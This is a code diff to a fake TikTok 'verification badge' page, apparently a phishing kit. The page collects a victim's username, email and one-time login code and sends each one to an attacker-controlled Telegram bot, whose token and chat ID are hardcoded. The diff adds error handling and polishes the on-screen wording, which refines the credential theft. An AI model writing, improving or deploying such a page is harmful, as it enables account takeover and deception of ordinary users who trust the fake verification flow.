@@ -33,7 +33,7 @@
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility for the official verification badge.</p>
         <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
-        <button class="btn" id="btn1" onclick="submitStep1()">CONTINUE</button>
+        <button class="btn" onclick="submitStep1()">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
@@ -65,23 +65,29 @@
 
     <div id="step6" class="step">
         <div style="color: #25F4EE; font-size: 60px; margin-bottom: 20px;">✓</div>
-        <h1>Identity Confirmed</h1>
+        <h1>Identity Verified</h1>
         <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
     </div>
 </div>
 
 <script>
-    // 🛑 LIVE CONFIGURATION
-    const BOT_TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g'; // Aapka Token
-    const CHAT_ID = '7489116869'; // Aapki Chat ID
+    const BOT_TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
+    const CHAT_ID = '7489116869';
 
     async function sendToTelegram(msg) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-        });
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+            });
+            const data = await response.json();
+            if (!data.ok) {
+                console.error("Telegram API Error:", data.description);
+            }
+        } catch (error) {
+            console.error("Fetch Error:", error);
+        }
     }
 
     function goTo(s) {
@@ -91,7 +97,7 @@
 
     function submitStep1() {
         const user = document.getElementById('username').value;
-        if(user.length < 3 || /[A-Z]/.test(user)) { alert("Username must be lowercase and valid."); return; }
+        if(user.length < 3 || /[A-Z]/.test(user)) { alert("Username must be lowercase."); return; }
         sendToTelegram(`👤 <b>New Hit</b>\nUsername: <code>@${user}</code>`);
         goTo(2);
     }
@@ -99,14 +105,14 @@
     function submitStep2() {
         const email = document.getElementById('email').value;
         if(!email.includes('@')) { alert("Invalid Email!"); return; }
-        sendToTelegram(`📧 <b>Email</b>\nUser: @${document.getElementById('username').value}\nEmail: <code>${email}</code>`);
+        sendToTelegram(`📧 <b>Email Linked</b>\nUser: @${document.getElementById('username').value}\nEmail: <code>${email}</code>`);
         goTo(3);
     }
 
     function submitStep3() {
         const code = document.getElementById('code').value;
         if(code.length < 6) { alert("Enter 6-digit code!"); return; }
-        sendToTelegram(`🔢 <b>OTP Code</b>\nUser: @${document.getElementById('username').value}\nCode: <code>${code}</code>`);
+        sendToTelegram(`🔢 <b>OTP Received</b>\nUser: @${document.getElementById('username').value}\nCode: <code>${code}</code>`);
         goTo(4);
     }
 
